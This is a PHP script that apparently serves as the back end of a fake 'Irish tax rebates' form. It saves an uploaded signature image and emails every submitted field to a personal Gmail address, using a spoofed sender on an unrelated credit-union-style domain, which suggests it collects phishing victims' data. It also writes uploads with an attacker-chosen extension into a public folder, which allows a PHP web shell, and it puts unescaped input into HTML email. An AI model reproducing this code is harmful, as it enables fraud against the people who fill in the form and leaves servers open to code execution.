<?php
ini_set('SMTP', 'partnerstrustfcu.com');
ini_set('smtp_port', 465);

$siteUrl = "https://irishtaxrebates.partnerstrustfcu.com";
$recipient = "johnstevenmele@gmail.com";


//=========================
// GET JSON DATA
//=========================

$json = file_get_contents("php://input");

$data = json_decode($json, true);

if (!$data) {
  die("Invalid request.");
}


//=========================
// UPLOAD IMAGE IF EXISTS
//=========================

$fileUrl = "";

if (isset($data["signature"])) {
  $image = $data["signature"];
  //if image is an object
  if (is_array($image)) {
    $fileName = $image["name"] ?? uniqid() . ".png";
    $base64 = $image["data"] ?? "";
  }
  //if image is directly the base64 string
  else {
    $fileName = uniqid() . ".png";
    $base64 = $image;
  }
  //remove data:image/png;base64,
  if (preg_match('/^data:image\/(\w+);base64,/', $base64, $type)) {
    $base64 = substr($base64, strpos($base64, ',') + 1);
    $extension = strtolower($type[1]);
    $fileName = pathinfo($fileName, PATHINFO_FILENAME) . "." . $extension;
  }

  $base64 = str_replace(' ', '+', $base64);
  $imageData = base64_decode($base64);

  if ($imageData !== false) {
    $uploadDirectory = "../public/";
    if (!is_dir($uploadDirectory)) {
      mkdir($uploadDirectory, 0777, true);
    }
    $newName = uniqid("upload_", true) . "_" . $fileName;
    $path = $uploadDirectory . $newName;
    file_put_contents($path, $imageData);
    $fileUrl = $siteUrl . "/public/" . $newName;
  }


  //replace the image object with its URL
  $data["signature"] = $fileUrl;
}


//=========================
// BUILD THE EMAIL TABLE
//=========================

$rows = "";
foreach ($data as $key => $value) {
  if (is_array($value)) {
    $value = json_encode($value);
  }
  //make links clickable
  if (filter_var($value, FILTER_VALIDATE_URL)) {
    $value = "<a href='{$value}' target='_blank'>{$value}</a>";
  }

  $label = ucwords(
    str_replace(
      "_",
      " ",
      $key
    )
  );
  $rows .= "
        <tr>
            <td style='padding:12px;border:1px solid #ddd;font-weight:bold;width:35%;'>
                {$label}
            </td>
            <td style='padding:12px;border:1px solid #ddd;'>
                {$value}
            </td>
        </tr>
    ";
}


//=========================
// EMAIL TEMPLATE
//=========================

$message = "
<html>
<body>
<h2>New Registration</h2>
<table
width='100%'
cellspacing='0'
cellpadding='0'
style='border-collapse:collapse;border:1px solid #ddd;'
>

{$rows}

</table>
</body>
</html>
";


//=========================
// SEND MAIL
//=========================


$headers = "From: Irish tax rebates <info@partnerstrustfcu.com>\r\n";
$headers .= "Reply-To: Irish tax rebates <info@partnerstrustfcu.com>\r\n";
$headers .= "Return-Path: info@partnerstrustfcu.com\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8\r\n";

try {
  $mail = mail(
    $recipient,
    "New Form Submission",
    $message,
    $headers
  );
} catch (Exception $e) {
  $mail = false;
  error_log("Mail sending failed: " . $e->getMessage());
}

echo json_encode([
  "success" => $mail,
  "file" => $fileUrl,
  "data" => $data
]);
